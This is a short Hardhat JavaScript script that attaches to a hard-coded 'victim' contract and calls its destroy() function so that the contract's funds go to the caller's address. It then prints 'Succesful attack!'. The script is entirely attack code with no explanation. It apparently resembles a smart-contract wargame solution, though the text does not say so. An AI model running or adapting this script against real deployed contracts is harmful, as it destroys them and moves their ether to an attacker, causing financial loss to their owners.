
const hre = require("hardhat");

async function main() {
  const victimContractAddress = '0x47D6cCB705D4b76557143538d584D9dB4ca11AA1';
  const myPublicKey = "0xF60Ba5a095EFAFA71c4c71e3E0C0c09Bcc76FEf4";

  const SimpleToken = await hre.ethers.getContractFactory("SimpleToken");
  const simpleToken = SimpleToken.attach(victimContractAddress);

  await simpleToken.destroy(myPublicKey); 

  console.log("Succesful attack!");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
